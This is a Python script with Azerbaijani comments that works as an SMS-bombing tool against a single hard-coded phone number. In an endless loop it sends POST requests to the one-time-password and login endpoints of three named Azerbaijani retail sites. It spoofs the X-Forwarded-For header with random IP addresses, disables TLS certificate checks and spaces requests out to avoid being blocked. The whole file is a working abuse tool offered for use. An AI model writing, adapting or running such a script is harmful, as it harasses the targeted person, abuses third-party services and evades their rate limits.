import urllib.request
import json
import random
import time
import ssl

# --- Səlahiyyətli Hədəf Nömrə ---
TARGET_PHONE = "994508880067" 

def final_storm():
    print(f"[!!!] SNIPER MODE AKTİVDİR: {TARGET_PHONE}")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Səlahiyyətli kəşfiyyat nəticəsində tapılmış real və dözümsüz API-lər
    API_LIST = [
        # Umico-nun real login qapısı
        {"n": "Umico", "u": "https://api.umico.az/api/v1/login/otp", "d": {"user_identifier": TARGET_PHONE, "type": "login"}},
        # AliPasha-nın süzgəcsiz qapısı
        {"n": "AliPasha", "u": "https://api.alipasha.az/api/v1/otp/send", "d": {"phone": TARGET_PHONE}},
        # BakuElectronics-in qeydiyyat qapısı
        {"n": "BakuElec", "u": "https://bakuelectronics.az/api/otp/send", "d": {"phone": TARGET_PHONE, "type": "registration"}}
    ]

    while True:
        for api in API_LIST:
            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                }
                
                req = urllib.request.Request(api["u"], data=json.dumps(api["d"]).encode(), headers=headers, method='POST')
                
                with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
                    print(f"[*] {api['n']} -> SUCCESS (Status: {resp.getcode()})")
                
                time.sleep(1.5) # Bloka düşməmək üçün sürətli ardıcıllıq

            except Exception as e:
                # print(f"[MISS] {api['n']}")
                pass
        
        print("--- Dalğa tamamlandı, davam edilir... ---")
        time.sleep(3)

if __name__ == "__main__":
    final_storm()
